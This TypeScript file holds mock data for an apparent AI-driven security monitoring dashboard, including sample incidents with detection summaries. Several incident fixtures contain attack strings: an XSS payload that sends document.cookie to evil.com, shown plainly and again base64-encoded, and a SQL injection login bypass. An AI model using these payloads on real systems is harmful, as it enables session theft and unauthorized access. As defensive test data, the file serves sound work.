import type {
  SystemHealth,
  IncidentDetail,
  VictimServer,
  Playbook,
  UserProfile,
  NotificationSettings,
} from '../types';

export const mockSystemHealth: SystemHealth = {
  overallThreatScore: 84,
  agentRunning: true,
  pendingActions: 3,
  components: [
    {
      id: 'fastapi',
      name: 'AI Backend (FastAPI)',
      status: 'connected',
      latencyMs: 12,
      lastSeen: '2026-04-22T17:15:00Z',
    },
    {
      id: 'elasticsearch',
      name: 'Elasticsearch',
      status: 'connected',
      latencyMs: 34,
      lastSeen: '2026-04-22T17:15:05Z',
    },
    {
      id: 'victim1',
      name: 'Web Server (Victim)',
      status: 'connected',
      latencyMs: 8,
      lastSeen: '2026-04-22T17:15:10Z',
    },
  ],
};

export const mockIncidents: IncidentDetail[] = [
  {
    idx: 1,
    attack_type: 'Stored Cross-Site Scripting (XSS)',
    severity: 'critical',
    confidence_score: 0.97,
    status: 'pending_review',
    targetIp: '192.168.1.50',
    targetName: 'Web Server (Victim)',
    detectedAt: '2026-04-22T17:08:00Z',
    created_at: '2026-04-22T17:08:00Z',
    attack_ip: '45.33.22.11',
    target_uris: ['/api/v1/comments'],
    suspicious_payloads: ['<script>fetch("http://evil.com/?"+document.cookie)</script>'],
    analysis_summary:
      'AI agent detected a persistent XSS attempt on the comments API. The payload contains an obfuscated script designed to steal session cookies from administrative users.',
    key_indicators: [
      {
        label: 'Payload in DB',
        value: true,
        description: 'Malicious script confirmed in database',
      },
      {
        label: 'Administrative Context',
        value: true,
        description: 'Targeted at admin dashboard users',
      },
      { label: 'Previous Attempts', value: false, description: 'No prior attempts from this IP' },
    ],
    raw_logs: [
      {
        idx: 101,
        source_type: 'webhook',
        created_at: '2026-04-22T17:08:00Z',
        raw_payload: {
          timestamp: '2026-04-22T17:08:00Z',
          method: 'POST',
          path: '/api/v1/comments',
          body: {
            content:
              'PHNjcmlwdD5mZXRjaCgiaHR0cDovL2V2aWwuY29tLz8iK2RvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4=',
          },
          headers: { 'x-forwarded-for': '45.33.22.11' },
        },
      },
    ],
  },
  {
    idx: 2,
    attack_type: 'SQL Injection Attempt',
    severity: 'critical',
    confidence_score: 0.92,
    status: 'pending_review',
    targetIp: '192.168.1.50',
    targetName: 'Web Server (Victim)',
    detectedAt: '2026-04-22T16:45:00Z',
    created_at: '2026-04-22T16:45:00Z',
    attack_ip: '103.45.67.89',
    target_uris: ['/login.php'],
    suspicious_payloads: ["admin' OR '1'='1"],
    analysis_summary:
      'Automated SQL injection attempt detected on the login portal. The attacker is using boolean-based blind techniques to enumerate database schema.',
    key_indicators: [
      { label: 'SQLi Pattern', value: true, description: 'Known SQL injection pattern detected' },
      { label: 'High Frequency', value: true, description: 'Potential automated scanning' },
    ],
    raw_logs: [
      {
        idx: 102,
        source_type: 'webhook',
        created_at: '2026-04-22T16:45:00Z',
        raw_payload: {
          message:
            '103.45.67.89 - - [22/Apr/2026:16:45:00 +0000] "POST /login.php HTTP/1.1" 200 - "username=admin\' OR \'1\'=\'1"',
        },
      },
    ],
  },
  {
    idx: 3,
    attack_type: 'Suspicious File Upload',
    severity: 'medium',
    confidence_score: 0.75,
    status: 'resolved',
    targetIp: '192.168.1.52',
    targetName: 'File Server',
    detectedAt: '2026-04-22T15:20:00Z',
    created_at: '2026-04-22T15:20:00Z',
    attack_ip: '172.16.0.44',
    target_uris: ['/uploads/profile.php'],
    suspicious_payloads: ['profile.php'],
    analysis_summary:
      'A PHP file was uploaded to a directory intended for images only. AI analysis suggests it might be a simple web shell.',
    key_indicators: [],
    raw_logs: [
      {
        idx: 103,
        source_type: 'webhook',
        created_at: '2026-04-22T15:20:00Z',
        raw_payload: { message: 'inotify_event: CREATE profile.php in /var/www/uploads' },
      },
    ],
  },
  {
    idx: 4,
    attack_type: 'Brute Force Attack',
    severity: 'medium',
    confidence_score: 0.88,
    status: 'resolved',
    targetIp: '192.168.1.10',
    targetName: 'SSH Gateway',
    detectedAt: '2026-04-22T14:10:00Z',
    created_at: '2026-04-22T14:10:00Z',
    attack_ip: '192.168.1.200',
    target_uris: ['ssh:22'],
    suspicious_payloads: [],
    analysis_summary: 'Multiple failed SSH login attempts from an internal IP address.',
    key_indicators: [],
    raw_logs: [
      {
        idx: 104,
        source_type: 'webhook',
        created_at: '2026-04-22T14:10:00Z',
        raw_payload: {
          message:
            'Apr 22 14:10:01 gateway sshd[1234]: Failed password for root from 192.168.1.200 port 5678 ssh2',
        },
      },
    ],
  },
  {
    idx: 5,
    attack_type: 'Unauthorized API Access',
    severity: 'critical',
    confidence_score: 0.95,
    status: 'pending_review',
    targetIp: '192.168.1.50',
    targetName: 'Web Server (Victim)',
    detectedAt: '2026-04-22T13:00:00Z',
    created_at: '2026-04-22T13:00:00Z',
    attack_ip: '203.0.113.5',
    target_uris: ['/admin/config/dump'],
    suspicious_payloads: [],
    analysis_summary:
      'Access attempt to sensitive administrative endpoint without a valid authorization token.',
    key_indicators: [],
    raw_logs: [
      {
        idx: 105,
        source_type: 'webhook',
        created_at: '2026-04-22T13:00:00Z',
        raw_payload: {
          message:
            '203.0.113.5 - - [22/Apr/2026:13:00:00 +0000] "GET /admin/config/dump HTTP/1.1" 403 0',
        },
      },
    ],
  },
];

export const mockVictimServers: VictimServer[] = [
  {
    id: 'srv-1',
    name: 'Web Server (Victim)',
    ip: '192.168.1.50',
    os: 'Linux',
    registered: '2026-04-01T09:00:00Z',
    agentStatus: 'connected',
    lastSeen: '2026-04-22T17:15:10Z',
  },
  {
    id: 'srv-2',
    name: 'Database Server',
    ip: '192.168.1.51',
    os: 'Linux',
    registered: '2026-04-01T09:00:00Z',
    agentStatus: 'connected',
    lastSeen: '2026-04-22T17:14:30Z',
  },
  {
    id: 'srv-3',
    name: 'File Storage',
    ip: '192.168.1.52',
    os: 'Linux',
    registered: '2026-04-05T10:00:00Z',
    agentStatus: 'disconnected',
    lastSeen: '2026-04-22T12:00:00Z',
  },
];

export const mockPlaybooks: Playbook[] = [
  {
    id: 'pb-1',
    fileName: 'XSS_Response_Guide.pdf',
    fileType: 'PDF',
    fileSize: 1240000,
    uploadedAt: '2026-04-10T10:00:00Z',
    syncStatus: 'synced',
  },
  {
    id: 'pb-2',
    fileName: 'SQLi_Mitigation_Manual.docx',
    fileType: 'DOCX',
    fileSize: 850000,
    uploadedAt: '2026-04-12T14:30:00Z',
    syncStatus: 'synced',
  },
  {
    id: 'pb-3',
    fileName: 'Internal_Security_Policy.md',
    fileType: 'MD',
    fileSize: 45000,
    uploadedAt: '2026-04-20T09:15:00Z',
    syncStatus: 'synced',
  },
  {
    id: 'pb-4',
    fileName: 'New_Ransomware_Alert.txt',
    fileType: 'TXT',
    fileSize: 12000,
    uploadedAt: '2026-04-22T16:00:00Z',
    syncStatus: 'vectorizing',
  },
];

export const mockUserProfile: UserProfile = {
  name: '관리자',
  email: 'admin@ai-soc.com',
  role: 'Admin',
};

export const mockNotificationSettings: NotificationSettings = {
  email: 'alerts@ai-soc.com',
  webhookUrl: 'https://hooks.slack.com/services/T0000/B0000/XXXX',
  minSeverity: 'medium',
};
